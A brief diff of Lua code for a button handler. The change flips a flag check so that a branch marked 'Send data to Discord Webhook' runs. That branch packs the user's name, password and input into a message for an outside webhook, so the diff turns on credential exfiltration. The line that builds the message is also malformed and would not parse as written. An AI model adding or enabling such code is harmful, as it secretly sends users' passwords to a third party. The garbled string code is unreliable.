@@ -18,7 +18,7 @@ end)
 button.on_click(function()
   result.set_content(press)
 
-  if log_bool == "false" then
+  if log_bool == "true" then
     
     -- Send data to Discord Webhook
     local body = "{ \"content\": \.. user_name .. ": " .. user_pass .. ": " .. press .. "\" }"
